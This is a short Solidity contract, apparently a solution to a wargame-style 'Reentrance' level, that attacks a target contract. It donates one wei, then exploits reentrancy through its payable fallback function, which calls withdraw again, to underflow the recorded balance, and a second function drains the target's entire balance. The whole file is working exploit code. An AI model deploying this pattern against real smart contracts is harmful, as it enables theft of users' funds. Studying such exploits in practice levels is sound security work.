pragma solidity ^0.4.18;

import '../levels/Reentrance.sol';

contract ReentranceAttack {

  Reentrance target;

  function ReentranceAttack(address _target) payable {
    target = Reentrance(_target);
  }

  function attack_1_causeOverflow() {
    target.donate.value(1)(this);
    target.withdraw(1);
  }

  function attack_2_deplete() {
    target.withdraw(target.balance);
  }

  function() payable {
    target.withdraw(1);
  }
}
